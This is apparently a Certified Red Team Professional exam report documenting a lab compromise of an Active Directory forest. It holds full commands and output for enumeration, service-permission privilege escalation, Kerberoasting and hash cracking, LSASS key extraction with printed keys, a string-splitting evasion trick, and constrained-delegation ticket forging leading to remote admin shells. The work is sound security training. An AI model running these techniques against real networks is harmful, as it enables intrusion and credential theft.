---
title: "Certified Red Team Professional Exam Report"
author: "Francesco Lonardo"
date: "2025-03-14"
subject: "Certified Red Team Professional (CRTP)"
lang: "en"
titlepage: true
titlepage-color: "F2F3F5"
titlepage-text-color: "000000"
titlepage-rule-color: "000000"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
colorlinks: true
linkcolor: orange
urlcolor: orange
toccolor: black
---

# Introduction

This report for the **Certified Red Team Professional (CRTP)** exam documents an entirely hands-on challenge designed to assess the ability to compromise a realistic Windows Active Directory environment by focusing on misconfigurations and advanced techniques, rather than trivial or "one-click" exploits. During the 24-hour exam window, I investigated multiple domains, enumerated configurations, and executed various techniques for privilege escalation and lateral movement. This document provides a detailed account of the steps, methodologies, and observations I made while compromising each target server in the lab environment.

## Exam Scope

- **Targets**: The exam lab contains five target servers, each with unique roles, domains, and configurations.
- **Entry Point VM**: A dedicated virtual machine was provided as a launch point to launch attacks within the environment, but it does not count as a target server.
- **Goal**: Achieve OS command execution on each target server. Full administrative privileges are helpful, but not explicitly required for passing.
- **Methodology**: Avoid destructive attacks, brute-forcing, or exploit kits that rely on patchable CVEs. Instead, leverage legitimate Windows features, AD misconfigurations, and known post-exploitation tools (appropriately documented in this report).

## Exam Objective

The primary aim was to **demonstrate a practical red team engagement** approach in an Active Directory environment, specifically by:

1. **Enumeration**: Identifying systems, domains, trust relationships, and potential misconfigurations.
2. **Initial foothold**: Gaining a stable entry point on each target server through techniques consistent with real-world post-exploitation (e.g., abusing permissions or roles rather than relying on patchable CVEs).
3. **Privilege Escalation and Lateral Movement**: Elevating privileges or moving across the environment through legitimate AD functionalities, to consolidate access and gather critical information (domain credentials, sensitive data, etc.).
4. **Documentation and Mitigation**: Documenting all findings, methods, and mitigation ideas in a clear, detailed manner to reflect a genuine attacker mindset while offering practical defensive measures.

By the conclusion of this report, the reader should understand both the **tactical steps** used (commands, scripts, screenshots) and the **rationale** behind them, why each approach was chosen, the potential threats posed to real environments, and how these threats might be prevented in a production setting.

---

# Executive Summary

This is a concise narrative of how the Active Directory environment was discovered, exploited, and ultimately fully compromised. This summary omits lower-impact details and focuses on the key steps that drove the attack forward.

- **Initial Recon and Limited Privileges**
    - Began by enumerating the `tech.finance.corp` child domain and forest relationship, revealing a two-domain (child/parent) structure with a bidirectional trust to `finance.corp`.
    - Identified relevant domain accounts, including `tech\sqlserversync` (with replication rights and SQL admin privileges on `dbserver31.tech.finance.corp`) and `tech\techservice` (actively logged on `mgmtsrv.tech.finance.corp`).
    - Found no immediately exploitable SMB shares or local administrative privileges (as `tech\studentuser`) in the environment.
- **Local Privilege Escalation on `studvm.tech.finance.corp`**
    - A misconfigured Windows service (`vds`) allowed modifying its binary path. By pointing it to `net localgroup Administrators tech\studentuser /add`, the attacker elevated to local admin on `studvm.tech.finance.corp`.
- **Constrained Delegation → Foothold on `mgmtsrv.tech.finance.corp`**
    - Enumeration revealed Constrained Delegation for the computer account `tech\STUDVM$`, delegating to CIFS on `mgmtsrv.tech.finance.corp`.
    - Forged an S4U ticket with `tech\STUDVM$`'s AES key, impersonating `Administrator`, and achieved remote administrative access on `mgmtsrv.tech.finance.corp`.
- **Further Credential Extraction and Persistence**
    - On `mgmtsrv.tech.finance.corp`, extracted the `tech\techservice` credentials and the machine `tech\MGMTSRV$`'s Kerberos keys.
    - Leveraged the Kerberos key of `tech\MGMTSRV$` to craft a Silver Ticket, granting persistent administrative access to the server without contacting the Domain Controller.
- **Pivot to `techsrv30.tech.finance.corp`**
    - With `tech\techservice`'s Kerberos key, performed an OverPass-The-Hash to obtain a TGT and connect to `techsrv30.tech.finance.corp`.
    - Extracted `tech\databaseagent` credentials and discovered it was a `sysadmin` on the SQL instance at `dbserver31.tech.finance.corp`.
- **SQL `xp_cmdshell` → Lateral Movement onto `dbserver31.tech.finance.corp`**
    - Abused the SQL `sysadmin` rights (`tech\databaseagent`) to run `xp_cmdshell` on `dbserver31.tech.finance.corp`, spawning a reverse shell as `tech\sqlserversync`.
    - Elevated to `SYSTEM` on `dbserver31.tech.finance.corp` via `GodPotato` token impersonation and then extracted the domain replication credentials of `tech\sqlserversync`.
- **DCSync and Domain Admin**
    - With `tech\sqlserversync`'s replication privileges, performed a DCSync attack to retrieve the `tech\administrator` and `tech\krbtgt` hashes and AES keys.
    - Forged a Golden Ticket (using the `tech\krbtgt` key) to gain Domain Admin privileges in `tech.finance.corp`.
- **Cross-Trust Attack to `finance.corp`**
    - Finally, abused the child-domain `tech\krbtgt` encryption key to inject an Enterprise Admin SID and impersonate an EA across the forest trust.
    - Obtained full administrative access on `finance-dc.finance.corp`, extracting more credentials and completing the root domain compromise.

By the end of these steps, the entire forest was under attacker control. Key techniques included service misconfiguration abuse, Constrained Delegation forging, OverPass-The-Hash, SQL `xp_cmdshell` exploitation, token impersonation for local escalation, LSASS memory dumps and DCSync for domain credentials, and Golden Ticket/SID History forging to extend compromise into the root domain.

---

# Attack Methodology

## **Domain Enumeration on `tech.finance.corp`** (successful)

Description: Performed a comprehensive enumeration of the `tech.finance.corp` domain and its forest context, revealing a two-domain forest (`finance.corp` as root and `tech.finance.corp` as child) with a bidirectional trust. Enumerated domain users, computers, and groups, noting that the built-in `Administrator` accounts reside in both Domain Admins and Enterprise Admins groups. Discovered that `tech\sqlserversync` has replication-related ACL rights, is a SQL Administrator for `dbserver31.tech.finance.corp`, and maintains an active session on that server. `tech\techservice` also has a session running on `mgmtsrv.tech.finance.corp`. Attempted to find SMB shares and local admin access, from the perspective of the user `tech\studentuser`, but no immediate misconfigurations or accessible shares were found. Overall, these findings established the groundwork for subsequent misconfigurations abuse, lateral movement and privilege escalation steps.

- 1.1) **Identify Domains, Forests, Trusts**

![](./assets/badges/studvm-studentuser0.svg){.left}

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\PowerView.ps1`

`Get-Domain`:
```
Forest                  : finance.corp🏰
DomainControllers       : {tech-dc.tech.finance.corp}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : finance.corp
PdcRoleOwner            : tech-dc.tech.finance.corp
RidRoleOwner            : tech-dc.tech.finance.corp
InfrastructureRoleOwner : tech-dc.tech.finance.corp
Name                    : tech.finance.corp🏛️
```

`Get-Forest`:
```
RootDomainSid         : S-1-5-21-1712611810-3596029332-2671080496
Name                  : finance.corp🏰
Sites                 : {Default-First-Site-Name}
Domains               : {finance.corp🏛️, tech.finance.corp🏛️}
GlobalCatalogs        : {finance-dc.finance.corp, tech-dc.tech.finance.corp}
ApplicationPartitions : {DC=ForestDnsZones,DC=finance,DC=corp, DC=DomainDnsZones,DC=tech,DC=finance,DC=corp, DC=DomainDnsZones,DC=finance,DC=corp}
ForestModeLevel       : 7
ForestMode            : Unknown
RootDomain            : finance.corp🏛️
Schema                : CN=Schema,CN=Configuration,DC=finance,DC=corp
SchemaRoleOwner       : finance-dc.finance.corp
NamingRoleOwner       : finance-dc.finance.corp
```

`Get-ForestDomain -Verbose`:
```
Forest                  : finance.corp
DomainControllers       : {finance-dc.finance.corp}🖥️
Children                : {tech.finance.corp}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  :
PdcRoleOwner            : finance-dc.finance.corp
RidRoleOwner            : finance-dc.finance.corp
InfrastructureRoleOwner : finance-dc.finance.corp
Name                    : finance.corp🏛️

Forest                  : finance.corp
DomainControllers       : {tech-dc.tech.finance.corp}🖥️
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : finance.corp
PdcRoleOwner            : tech-dc.tech.finance.corp
RidRoleOwner            : tech-dc.tech.finance.corp
InfrastructureRoleOwner : tech-dc.tech.finance.corp
Name                    : tech.finance.corp🏛️
```

`Get-DomainTrust`:
```
SourceName      : tech.finance.corp🏛️
TargetName      : finance.corp🏛️
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST🔗
TrustDirection  : Bidirectional🔗
WhenCreated     : 2/2/2022 6:53:13 AM
WhenChanged     : 3/11/2025 8:53:24 AM
```

`Get-ForestTrust`:
```
```
❌

| Forest       | Domain              | Parent Domain   | Domain Controllers                | Trusts                              |
|-------------|---------------------|----------------|-----------------------------------|-------------------------------------|
| finance.corp | finance.corp       | -              | finance-dc.finance.corp          | -                                   |
| finance.corp | tech.finance.corp  | finance.corp   | tech-dc.tech.finance.corp        | Bidirectional trust with finance.corp (WITHIN_FOREST) |

- 1.2) **Identify Domain Users, Computers, Groups**

![](./assets/badges/studvm-studentuser0.svg){.left}

`whoami`:
```
tech\studentuser👤
```

`Get-DomainUser | select -ExpandProperty samaccountname`:
```
Administrator👤
Guest👤
krbtgt👤
studentuser👤
techservice👤
databaseagent👤
sqlserversync👤
```

`hostname`:
```
studvm🖥️
```

`Get-DomainComputer | select -ExpandProperty samaccountname`:
```
TECH-DC$🖥️
STUDVM$🖥️
MGMTSRV$🖥️
TECHSRV30$🖥️
DBSERVER31$🖥️
```

`Get-DomainComputer | select -ExpandProperty dnshostname`:
```
tech-dc.tech.finance.corp🖥️
studvm.tech.finance.corp🖥️
mgmtsrv.tech.finance.corp🖥️
techsrv30.tech.finance.corp🖥️
dbserver31.tech.finance.corp🖥️
```

`notepad C:\AD\Tools\servers.txt`:
```
mgmtsrv.tech.finance.corp
techsrv30.tech.finance.corp
dbserver31.tech.finance.corp
```

`Get-DomainGroupMember -Identity 'Domain Admins'`:
```
GroupDomain             : tech.finance.corp
GroupName               : Domain Admins👥
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=tech,DC=finance,DC=corp
MemberDomain            : tech.finance.corp
MemberName              : Administrator👤
MemberDistinguishedName : CN=Administrator,CN=Users,DC=tech,DC=finance,DC=corp
MemberObjectClass       : user
MemberSID               : S-1-5-21-1325336202-3661212667-302732393-500
```

`Get-DomainGroupMember -Identity 'Enterprise Admins' -Domain 'finance.corp'`:
```
GroupDomain             : finance.corp
GroupName               : Enterprise Admins👥
GroupDistinguishedName  : CN=Enterprise Admins,CN=Users,DC=finance,DC=corp
MemberDomain            : finance.corp
MemberName              : Administrator👑
MemberDistinguishedName : CN=Administrator,CN=Users,DC=finance,DC=corp
MemberObjectClass       : user
MemberSID               : S-1-5-21-1712611810-3596029332-2671080496-500
```

![BloodHound | DCSync Rights](./assets/screenshots/crtp_exam_report_bloodhound_dcsync_rights.png)

![BloodHound | SQL Admin](./assets/screenshots/crtp_exam_report_bloodhound_sql_admin.png)

- 1.3) **Identify Domain ACLs, OUs, GPOs**

![](./assets/badges/studvm-studentuser0.svg){.left}

`Find-InterestingDomainACL -ResolveGUIDs | ?{$_.identityreferencename -match 'sqlserversync'}`:
```
ObjectDN                : DC=tech,DC=finance,DC=corp
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : ExtendedRight
ObjectAceType           : DS-Replication-Get-Changes-In-Filtered-Set📑
AceFlags                : None
AceType                 : AccessAllowedObject
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-1325336202-3661212667-302732393-1111
IdentityReferenceName   : sqlserversync👤
IdentityReferenceDomain : tech.finance.corp
IdentityReferenceDN     : CN=sqlserver sync,CN=Users,DC=tech,DC=finance,DC=corp
IdentityReferenceClass  : user

ObjectDN                : DC=tech,DC=finance,DC=corp
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : ExtendedRight
ObjectAceType           : DS-Replication-Get-Changes📑
AceFlags                : None
AceType                 : AccessAllowedObject
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-1325336202-3661212667-302732393-1111
IdentityReferenceName   : sqlserversync👤
IdentityReferenceDomain : tech.finance.corp
IdentityReferenceDN     : CN=sqlserver sync,CN=Users,DC=tech,DC=finance,DC=corp
IdentityReferenceClass  : user

ObjectDN                : DC=tech,DC=finance,DC=corp
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : ExtendedRight
ObjectAceType           : DS-Replication-Get-Changes-All📑
AceFlags                : None
AceType                 : AccessAllowedObject
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-1325336202-3661212667-302732393-1111
IdentityReferenceName   : sqlserversync👤
IdentityReferenceDomain : tech.finance.corp
IdentityReferenceDN     : CN=sqlserver sync,CN=Users,DC=tech,DC=finance,DC=corp
IdentityReferenceClass  : user
```

`Get-DomainOU | select -ExpandProperty name`:
```
[SNIP]
```
❌

`Get-DomainGPO | select -ExpandProperty displayname`:
```
[SNIP]
```
❌

- 1.4) **Attempt to Discovery Domain Shares**

![](./assets/badges/studvm-studentuser0.svg){.left}

`Import-Module C:\AD\Tools\PowerHuntShares.psm1`

`Invoke-HuntSMBShares -NoPing -OutputDirectory C:\AD\Tools\ -HostList C:\AD\Tools\servers.txt`:
```
[SNIP]

 ---------------------------------------------------------------
 |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
 ---------------------------------------------------------------
 SHARE DISCOVERY📌
 ---------------------------------------------------------------
 [*][03/11/2025 03:05] Scan Start
 [*][03/11/2025 03:05] Output Directory: C:\AD\Tools\\SmbShareHunt-03112025030549
 [*][03/11/2025 03:05] Importing computer targets from C:\AD\Tools\servers.txt
 [*][03/11/2025 03:05] 3 systems will be targeted
 [*][03/11/2025 03:05] - Skipping ping scan.
 [*][03/11/2025 03:05] Checking if TCP Port 445 is open on 4 computers
 [*][03/11/2025 03:05] - 3 computers have TCP port 445 open.
 [*][03/11/2025 03:05] Getting a list of SMB shares from 3 computers

[SNIP]
```

![PowerHuntShares - ShareGraph](./assets/screenshots/crtp_exam_report_powerhuntshares_sharegraph.png)

- 1.5) **Identify Local Admin Access**

![](./assets/badges/studvm-studentuser0.svg){.left}

`Import-Module C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1`

`Find-PSRemotingLocalAdminAccess -Domain 'tech.finance.corp'`:
```
```
❌

- 1.6) **Identify Domain Active Sessions**

![](./assets/badges/studvm-studentuser0.svg){.left}

`Import-Module C:\AD\Tools\Invoke-SessionHunter.ps1`

`Invoke-SessionHunter -NoPortScan -RawResults -Targets C:\AD\Tools\servers.txt | select Hostname,UserSession,Access`:
```
[+] Elapsed time: 0:0:3.188

HostName     UserSession          Access
--------     -----------          ------
dbserver31🖥️ TECH\sqlserversync👤  False
mgmtsrv🖥️    TECH\techservice👤    False
```

---

### Local Privilege Escalation | Service Abuse (with PowerUp)

2) **Service Abuse on `studvm.tech.finance.corp` for Local Privilege Escalation** (successful ✅)

Description: Discovered a misconfigured Windows service (`vds`) that was running as `LocalSystem` and allowed modifications to its binary path. By leveraging `PowerUp`, the service's path was temporarily replaced with a command to add `tech\studentuser` to the local Administrators group. This successfully elevated the user's privileges on `studvm.tech.finance.corp`.

![](./assets/badges/studvm-studentuser0.svg){.left}

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\PowerUp.ps1`

`Invoke-AllChecks`:
```
[SNIP]

ServiceName                     : gupdate📌
Path                            : "C:\Program Files (x86)\Google\Update\GoogleUpdate.exe" /svc
ModifiableFile                  : C:\
ModifiableFilePermissions       : AppendData/AddSubdirectory
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem📌
AbuseFunction                   : Install-ServiceBinary -Name 'gupdate'
CanRestart                      : False❌
Name                            : gupdate
Check                           : Modifiable Service Files

[SNIP]

ServiceName   : vds📌
Path          : C:\Windows\System32\vds.exe
StartName     : LocalSystem📌
AbuseFunction : Invoke-ServiceAbuse -Name 'vds'
CanRestart    : True📌
Name          : vds
Check         : Modifiable Services

[SNIP]
```

`Invoke-ServiceAbuse -Name 'vds' -UserName 'tech\studentuser' -Verbose`:
```
VERBOSE: Service 'vds' original path: 'C:\Windows\System32\vds.exe'
VERBOSE: Service 'vds' original state: 'Running'
VERBOSE: Executing command 'net localgroup Administrators tech\studentuser /add'
VERBOSE: binPath for vds successfully set to 'net localgroup Administrators tech\studentuser /add'⏫
VERBOSE: Restoring original path to service 'vds'
VERBOSE: binPath for vds successfully set to 'C:\Windows\System32\vds.exe'
VERBOSE: Restarting 'vds'

ServiceAbused Command
------------- -------
vds           net localgroup Administrators tech\studentuser /add⏫
```

![](./assets/badges/studvm-studentuser1.svg){.left}

`whoami /groups`:
```
GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ===============================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators👥                   Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner✅

[SNIP]
```

![Windows Defender - Turn Off](./assets/screenshots/crtp_exam_report_windows_defender_turnoff.png)

![Windows Firewall - Turn Off](./assets/screenshots/crtp_exam_report_windows_firewall_turnoff.png)

---

### Kerberoasting (with PowerView, Rubeus, John)

3) **Kerberoasting Attack for Domain Lateral Movement to `dbserver31.tech.finance.corp`** (unsuccessful ❌)

Description: Enumerated service accounts with Service Principal Names (SPNs) and performed a Kerberoasting attack on `tech\sqlserversync` in an attempt to gain the service account password and pivot onto `dbserver31.tech.finance.corp`. Although the Kerberos TGS was successfully extracted, the password could not be cracked with multiple wordlists, implying a strong password policy.

![](./assets/badges/studvm-studentuser0.svg){.left}

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\PowerView.ps1`

`Get-DomainUser -SPN`:
```
[SNIP]

logoncount            : 8
badpasswordtime       : 12/31/1600 4:00:00 PM
distinguishedname     : CN=sqlserver sync,CN=Users,DC=tech,DC=finance,DC=corp
objectclass           : {top, person, organizationalPerson, user}
displayname           : sqlserver sync
lastlogontimestamp    : 2/4/2022 5:36:37 AM
userprincipalname     : sqlserversync
samaccountname        : sqlserversync👤
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 2/6/2022 7:47:34 AM
instancetype          : 4
usncreated            : 26345
objectguid            : 49050a8e-94f9-4ef3-9fdb-fc488cddf552
sn                    : sync
lastlogoff            : 12/31/1600 4:00:00 PM
whencreated           : 2/4/2022 1:16:06 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=finance,DC=corp
dscorepropagationdata : {2/4/2022 1:16:34 PM, 2/4/2022 1:16:06 PM, 1/1/1601 12:00:01 AM}
serviceprincipalname📌: MSSQLSvc📌/dbserver31.tech.finance.corp🖥️
givenname             : sqlserver
usnchanged            : 37100
lastlogon             : 2/5/2022 11:48:16 PM
badpwdcount           : 0
cn                    : sqlserver sync
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
objectsid             : S-1-5-21-1325336202-3661212667-302732393-1111
primarygroupid        : 513
pwdlastset            : 2/5/2022 6:16:18 AM
name                  : sqlserver sync

[SNIP]
```

```powershell
$z="t";$y="s";$x="a";$w="o";$v="r";$u="e";$t="b";$s="r";$r="e";$q="k";$Pwn="$q$r$s$t$u$v$w$x$y$z"
```

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args $Pwn /user:sqlserversync /simple /rc4opsec /format:john /outfile:C:\AD\Tools\krb5tgs_hashes.txt`:
```
[*] Action: Kerberoasting📌

[*] Using 'tgtdeleg' to request a TGT for the current user
[*] RC4_HMAC will be the requested for AES-enabled accounts, all etypes will be requested for everything else
[*] Target User            : sqlserversync👤
[*] Target Domain          : tech.finance.corp
[+] Ticket successfully imported!
[*] Searching for accounts that only support RC4_HMAC, no AES
[*] Searching path 'LDAP://tech-dc.tech.finance.corp/DC=tech,DC=finance,DC=corp' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=sqlserversync)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24))'

[*] Total kerberoastable users : 1

[*] Hash written to C:\AD\Tools\krb5tgs_hashes.txt

[*] Roasted hashes written to : C:\AD\Tools\krb5tgs_hashes.txt📌
```

![](./assets/badges/studvm-studentuser0.svg){.left}

`type C:\AD\Tools\krb5tgs_hashes.txt`:
```
$krb5tgs$23$*sqlserversync$tech.finance.corp$MSSQLSvc/dbserver31.tech.finance.corp*$E149345BAB64831EC028269E3F223675$8227DBD5D1EF86C63D7C612E2060BFC72EF3423713033D0BD5C9C7FD24423C892EB59E25B861E0E270726C87819C9CA6267962C1BD84793F8E72820D9C5017475A08

[SNIP]
```

![](./assets/badges/kali-attacker0.svg){.left}

`john --format=krb5tgs --wordlist=./10k-worst-pass.txt ./krb5tgs_hashes.txt`:
```
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:00 DONE (2025-03-11 08:42) 0g/s 1000Kp/s 1000Kc/s 1000KC/s fffff1..eyphed
Session completed. 
```
❌

`john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt ./krb5tgs_hashes.txt`:
```
```
❌

`john --format=krb5tgs --wordlist=/usr/share/seclists/Passwords/xato-net-10-million-passwords.txt ./krb5tgs_hashes.txt`:
```
```
❌

---

### Constrained Delegation + Domain Lateral Movement (with PowerView, Rubeus, SafetyKatz)

4) **Constrained Delegation Abuse on `studvm.tech.finance.corp` for Domain Lateral Movement to `mgmtsrv.tech.finance.corp`** (successful ✅)

Description: Performed Active Directory enumeration to identify users or machines with Constrained Delegation enabled. The attempt to find a user account with delegation rights was unsuccessful. However, enumeration of computer accounts revealed that `tech\STUDVM$` has Constrained Delegation enabled and is allowed to delegate authentication to the CIFS service on `mgmtsrv.tech.finance.corp`. This finding was leveraged to impersonate a privileged user and enabling lateral movement onto `mgmtsrv.tech.finance.corp`.

- 4.1) **Attempt to Find a Delegator User where Constrained Delegation is Enabled**

![](./assets/badges/studvm-studentuser0.svg){.left}

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\PowerView.ps1`

`Get-DomainUser -TrustedToAuth`:
```
```
❌

- 4.2) **Identify a Delegator Server where Constrained Delegation is Enabled**

![](./assets/badges/studvm-studentuser0.svg){.left}

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\PowerView.ps1`

`Get-DomainComputer -TrustedToAuth`:
```
[SNIP]

pwdlastset                    : 3/11/2025 7:10:31 AM
logoncount                    : 53
badpasswordtime               : 2/4/2022 2:55:13 AM
distinguishedname             : CN=STUDVM,CN=Computers,DC=tech,DC=finance,DC=corp
objectclass                   : {top, person, organizationalPerson, user...}
lastlogontimestamp            : 3/11/2025 6:57:17 AM
whencreated                   : 2/2/2022 7:13:14 AM
samaccountname                : STUDVM$🖥️
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT📌
whenchanged                   : 3/11/2025 2:10:31 PM
accountexpires                : NEVER
countrycode                   : 0
operatingsystem               : Windows Server 2019 Standard
instancetype                  : 4
useraccountcontrol            : WORKSTATION_TRUST_ACCOUNT, TRUSTED_TO_AUTH_FOR_DELEGATION📌
objectguid                    : 321b38f3-2d61-4b7d-b3f0-9d8b8c94b266
operatingsystemversion        : 10.0 (17763)
lastlogoff                    : 12/31/1600 4:00:00 PM
msds-allowedtodelegateto📌    : {CIFS📌/mgmtsrv🖥️.tech.finance.corp, CIFS/mgmtsrv}
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=finance,DC=corp
dscorepropagationdata         : {2/4/2022 1:16:34 PM, 1/1/1601 12:00:01 AM}
serviceprincipalname          : {TERMSRV/STUDVM, TERMSRV/studvm.tech.finance.corp, WSMAN/studvm, WSMAN/studvm.tech.finance.corp...}
usncreated                    : 12921
usnchanged                    : 65667
lastlogon                     : 3/11/2025 8:52:57 AM
badpwdcount                   : 0
cn                            : STUDVM
msds-supportedencryptiontypes : 28
objectsid                     : S-1-5-21-1325336202-3661212667-302732393-1104
primarygroupid                : 515
iscriticalsystemobject        : False
name                          : STUDVM
dnshostname                   : studvm.tech.finance.corp

[SNIP]
```

- 4.3) **Extract the Delegator Server AES Kerberos Key**

![](./assets/badges/studvm-studentuser1.svg){.left}

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"`:
```
[SNIP]

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : STUDVM$🖥️
Domain            : TECH
Logon Server      : (null)
Logon Time        : 3/11/2025 5:54:44 AM
SID               : S-1-5-18

         * Username : studvm$
         * Domain   : TECH.FINANCE.CORP
         * Password : 10 8b c6 de dc 62 e8 c7 98 35 52 d0 87 32 9c c4 35 6e f8 8b e4 33 50 a7 12 68 43 02 13 6a bb 4a 74 e3 b6 2c 1e db ad 93 61 18 17 08 09 89 c1 64 30 fa 85 3b 50 76 2b df 9b 11 d8 20 4f 23 a2 c4 17 db 43 62 54 c2 0b 0e d9 72 b0 de 2e 9f dd e9 96 63 4f 09 12 84 77 f6 0e 6c 13 86 93 54 8c 77 b2 5d ec b3 7a bb 99 3b 2e 06 b9 00 39 44 d4 c7 3b 09 2d 7a 7d 1c 01 26 bf cd 22 45 43 5a 3d b5 58 95 fe f1 4f 38 c6 86 48 eb 44 86 cc bd 43 ce 82 b1 4e 7b a2 fd 09 fb 87 d4 10 f6 47 0e c0 b3 b1 2b 4a f6 e7 32 c4 03 8a fb 58 25 8a 40 46 8e e1 bc f8 8d 0f f8 a3 fa 12 1f 0d c0 58 f8 88 88 53 bf 1e a1 4d 29 de d0 b4 96 87 de 64 02 d4 92 8f c3 e4 36 f3 93 b1 38 2e 68 6f 4b 1d fb 9e 2f 10 9c 72 22 8d a6 5b d8 4d df 7a d6 f1 06 9f 4c
         * Key List :
           aes256_hmac       7f2a3239887475600fcc8595732fa9fd9756a3042254baba6c7600560a1c5eb6🔑
           rc4_hmac_nt       e5c5fa4934a2a058fb61bf3a143d4050
           rc4_hmac_old      e5c5fa4934a2a058fb61bf3a143d4050
           rc4_md4           e5c5fa4934a2a058fb61bf3a143d4050
           rc4_hmac_nt_exp   e5c5fa4934a2a058fb61bf3a143d4050
           rc4_hmac_old_exp  e5c5fa4934a2a058fb61bf3a143d4050

[SNIP]
```

- 4.4) **Forge an S4U TGS using the Delegator Server AES Kerberos Key for the CIFS Service Delegation and Leverage it to Request and Obtain a TGS for the HTTP Service**

![](./assets/badges/studvm-studentuser1.svg){.left}

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:studvm$ /aes256:7f2a3239887475600fcc8595732fa9fd9756a3042254baba6c7600560a1c5eb6 /impersonateuser:Administrator /msdsspn:CIFS/mgmtsrv.tech.finance.corp /altservice:http /ptt`:
```
[SNIP]

[*] Action: S4U📌

[*] Using aes256_cts_hmac_sha1 hash: 7f2a3239887475600fcc8595732fa9fd9756a3042254baba6c7600560a1c5eb6
[*] Building AS-REQ (w/ preauth) for: 'tech.finance.corp\studvm$'
[*] Using domain controller: 172.16.4.1:88
[+] TGT request successful!📌
[*] base64(ticket.kirbi):

[SNIP]

[*] Action: S4U📌

[*] Building S4U2self request for: 'studvm$@TECH.FINANCE.CORP'
[*] Using domain controller: tech-dc.tech.finance.corp (172.16.4.1)
[*] Sending S4U2self request to 172.16.4.1:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator'🎭 to 'studvm$🖥️@TECH.FINANCE.CORP'🏛️
[*] base64(ticket.kirbi):

[SNIP]

[*] Impersonating user 'Administrator'🎭 to target SPN 'CIFS📌/mgmtsrv🖥️.tech.finance.corp'
[*]   Final ticket will be for the alternate service 'ldap'
[*] Building S4U2proxy request for service: 'CIFS/mgmtsrv.tech.finance.corp'
[*] Using domain controller: tech-dc.tech.finance.corp (172.16.4.1)
[*] Sending S4U2proxy request to domain controller 172.16.4.1:88
[+] S4U2proxy success!
[*] Substituting alternative service name 'http'📌
[*] base64(ticket.kirbi) for SPN 'http📌/mgmtsrv🖥️.tech.finance.corp':

[SNIP]

[+] Ticket successfully imported!🎟️
```

`klist`:
```
Cached Tickets: (1)

#0>     Client: Administrator🎭 @ TECH.FINANCE.CORP🏛️
        Server: http📌/mgmtsrv🖥️.tech.finance.corp @ TECH.FINANCE.CORP
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 3/11/2025 9:10:04 (local)
        End Time:   3/11/2025 19:10:04 (local)
        Renew Time: 3/18/2025 9:10:04 (local)
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```

- 4.5) **Leverage the Obtained Ticket to Gain Administrator Access and Remote Control on the Delegatee Server**

`winrs -r:mgmtsrv.tech.finance.corp cmd`:
```
Microsoft Windows [Version 10.0.17763.2452]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator.TECH>
```
🚀

![](./assets/badges/mgmtsrv-administrator1.svg){.left}

`set username`:
```
USERNAME=Administrator👤
```

`set computername`:
```
COMPUTERNAME=MGMTSRV🖥️
```
🚩

---

### Credential Extraction (with SafetyKatz)

5) **Credential Extraction on `mgmtsrv.tech.finance.corp`** (successful ✅)

Description: Executed PowerShell logging and AMSI bypass techniques to evade detection while performing credential extraction. Extracted cleartext credentials and Kerberos keys of `tech\techservice` and `tech\MGMTSRV$` from LSASS memory on `mgmtsrv.tech.finance.corp`. These credentials will be leveraged for lateral movement and further privilege escalation within the domain.

![](./assets/badges/mgmtsrv-administrator1.svg){.left}

